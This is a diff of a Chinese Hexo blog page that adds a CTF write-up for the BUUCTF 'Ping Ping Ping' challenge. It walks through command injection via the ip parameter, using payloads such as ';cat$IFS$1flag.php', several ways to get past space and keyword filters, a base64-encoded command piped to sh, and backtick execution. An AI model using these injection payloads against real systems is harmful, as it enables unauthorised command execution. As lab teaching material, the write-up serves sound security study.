@@ -28,7 +28,7 @@ var CONFIG = {
   sourcePath: {"js":"js","css":"css","images":"images"},
 };
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/06/BUU-1/">陪AZ的WebBUU刷题(一)</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-13</span></span></div></header><div class="post-body"><div class="post-excerpt">
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/06/BUU-1/">陪AZ的WebBUU刷题(一)</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-14</span></span></div></header><div class="post-body"><div class="post-excerpt">
         <h1 id="一、-极客大挑战-2019-EasySQL"   >
           <a href="#一、-极客大挑战-2019-EasySQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、-极客大挑战-2019-EasySQL" class="headerlink" title="一、[极客大挑战 2019]EasySQL"></a>一、[极客大挑战 2019]EasySQL</h1>
       <p>题目是一个登录页面，首先考虑是否是SQL注入，通过查看网页源代码发现!</p>
@@ -183,6 +183,61 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
 <p>便出现了一串长长长长长长的字符，再利用CyberChef解码</p>
 <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201131142372.png" alt="image-20220113114238307"></p>
 <p>这不就来了？</p>
+
+        <h1 id="七、-GXYCTF2019-Ping-Ping-Ping-1"   >
+          <a href="#七、-GXYCTF2019-Ping-Ping-Ping-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、-GXYCTF2019-Ping-Ping-Ping-1" class="headerlink" title="七、[GXYCTF2019]Ping Ping Ping 1"></a>七、[GXYCTF2019]Ping Ping Ping 1</h1>
+      <p>打开后</p>
+<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201141031346.png" alt="image-20220114103114254"></p>
+<p>显然，又是命令执行</p>
+<p>打开一下当前目录</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;ls</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201141037345.png" alt="image-20220114103700307"></p>
+<p>尝试打开flag文件</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;cat flag</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201141038492.png" alt="image-20220114103835453"></p>
+<p>space表明网站对空格进行了过滤，应该想办法绕过空格，方法有：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //1改成加其他数字貌似都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></div></figure>
+
+<p>于是我们尝试输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;cat$IFS$1flag.php</span><br></pre></td></tr></table></div></figure>
+
+<p>然鹅</p>
+<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201141042362.png" alt="image-20220114104254334"></p>
+<p>flag也被过滤了</p>
+
+        <h3 id="法Ⅰ：用其他变量把flag拼接"   >
+          <a href="#法Ⅰ：用其他变量把flag拼接" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：用其他变量把flag拼接" class="headerlink" title="法Ⅰ：用其他变量把flag拼接"></a>法Ⅰ：用其他变量把flag拼接</h3>
+      <p>即：用某一变量代替flag中的某一部分</p>
+<p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;b=g=cat$IFS$1fla$b.php  //$b即g</span><br></pre></td></tr></table></div></figure>
+
+<p>回车后查看网页源代码</p>
+<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201141526995.png" alt="image-20220114152656926"></p>
+
+        <h3 id="法Ⅱ：对cat-flag-php进行base64加密"   >
+          <a href="#法Ⅱ：对cat-flag-php进行base64加密" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：对cat-flag-php进行base64加密" class="headerlink" title="法Ⅱ：对cat flag.php进行base64加密"></a>法Ⅱ：对cat flag.php进行base64加密</h3>
+      <p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201141529604.png" alt="image-20220114152923516"></p>
+<p>由于过滤掉了bash，就用sh</p>
+<p>即输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></div></figure>
+
+<p>回车后查看网页源代码</p>
+<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201141532132.png" alt="image-20220114153215098"></p>
+
+        <h3 id="法Ⅲ：内联执行"   >
+          <a href="#法Ⅲ：内联执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅲ：内联执行" class="headerlink" title="法Ⅲ：内联执行"></a>法Ⅲ：内联执行</h3>
+      <p>反引号内的命令优先执行</p>
+<p>举个栗子：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ a=flag;</span><br><span class="line">cat `echo $a` //即cat flag</span><br></pre></td></tr></table></div></figure>
+
+<p>输入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;cat$IFS$1`ls`   //因为flag本就在当前根目录下，所以反引号内为ls</span><br></pre></td></tr></table></div></figure>
+
+<p>回车后查看网页源代码</p>
+<p><img src="https://gitee.com/PiDanX/image-bed/raw/master//Img/202201141540730.png" alt="image-20220114154020683"></p>
+<p>都有了</p>
 </div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/06/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">PHP环境搭建</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-14</span></span></div></header><div class="post-body"><div class="post-excerpt">
         <h1 id="一、调试搭建"   >
           <a href="#一、调试搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、调试搭建" class="headerlink" title="一、调试搭建"></a>一、调试搭建</h1>
